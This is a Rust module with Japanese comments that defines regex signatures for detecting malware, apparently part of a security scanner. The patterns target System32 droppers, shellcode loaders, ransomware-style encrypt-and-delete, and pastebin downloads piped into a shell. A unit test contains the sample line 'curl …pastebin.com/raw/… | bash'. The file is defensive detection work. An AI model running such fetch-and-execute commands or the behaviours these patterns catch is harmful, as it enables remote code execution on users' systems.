//! 既知のウイルス/マルウェア検体シグネチャ(静的検出用)。
//!
//! **正直な開示**: これは商用アンチウイルスのような数百万件のウイルス
//! 定義DBではない。実ファイル/EXEの本格的なスキャンは[`crate::clamav`]
//! 経由でClamAVに委譲する前提で、ここではClamAV未導入環境でも最低限
//! 引っかけられる「確実に悪性/テスト用と分かる」少数のシグネチャだけを
//! 持つ。主目的はEICARテスト検体の検出(アンチウイルスの動作確認用の
//! 業界標準テストファイル)と、ソース/スクリプトに紛れ込んだ数種の
//! 明確なマルウェア指標の検出。

use regex::Regex;

/// EICARテスト検体の識別ラベル。
///
/// EICARの完全な68バイト文字列そのものをこのソースへ埋め込むと、
/// RS-Guard自身のリポジトリがアンチウイルスに検出されてしまう
/// (典型的な自己検出の罠)。それを避けるため、検体の**ラベル部分**
/// (これ単体ではAVを発火させない)を正規表現で検出する方式にする。
pub fn eicar_label_regex() -> Regex {
    Regex::new(r"EICAR-STANDARD-ANTIVIRUS-TEST-FILE").unwrap()
}

/// ソース/スクリプトに現れる明確なマルウェア指標。
/// `(名前, 正規表現)`。深刻度は呼び出し側で`Critical`扱いにする。
pub fn malware_signatures() -> Vec<(&'static str, Regex)> {
    vec![
        ("eicar-test-file", eicar_label_regex()),
        // Windowsのシステム領域へ実行ファイルを書き込む典型(ドロッパー)。
        ("dropper-to-system32", Regex::new(r"(?i)(System32|SysWOW64)\\[^\n]{0,40}\.(exe|dll|scr)").unwrap()),
        // メモリ上で復号→直接実行するシェルコードローダーの兆候。
        ("shellcode-virtualalloc-exec", Regex::new(r"(?i)VirtualAlloc[^\n]{0,120}(CreateThread|memcpy|WriteProcessMemory)").unwrap()),
        // ランサムウェア的な一括暗号化+削除(拡張子を書き換えながら元を消す)。
        ("mass-file-encrypt-then-delete", Regex::new(r"(?i)(AES|RSA|Fernet)[^\n]{0,120}(os\.remove|unlink|del /|Remove-Item)").unwrap()),
        // 既知のマルウェア配布に多用される使い捨てホスト経由の実行。
        ("run-from-pastebin-raw", Regex::new(r"(?i)(pastebin\.com/raw|transfer\.sh|0x0\.st)[^\n]{0,80}(\|\s*(sh|bash)|iex|Invoke-Expression)").unwrap()),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_eicar_label() {
        // 完全なEICAR文字列は使わず、ラベル部分のみでテストする
        // (このテストファイル自体がAVに検出されないようにするため)。
        let sample = "some text EICAR-STANDARD-ANTIVIRUS-TEST-FILE more text";
        assert!(eicar_label_regex().is_match(sample));
    }

    #[test]
    fn clean_text_does_not_match_eicar() {
        assert!(!eicar_label_regex().is_match("a perfectly normal antivirus config file"));
    }

    #[test]
    fn malware_signatures_are_non_empty() {
        assert!(!malware_signatures().is_empty());
    }

    #[test]
    fn detects_run_from_pastebin_raw() {
        let (_, re) = malware_signatures().into_iter().find(|(n, _)| *n == "run-from-pastebin-raw").unwrap();
        assert!(re.is_match("curl https://pastebin.com/raw/abc123 | bash"));
    }
}
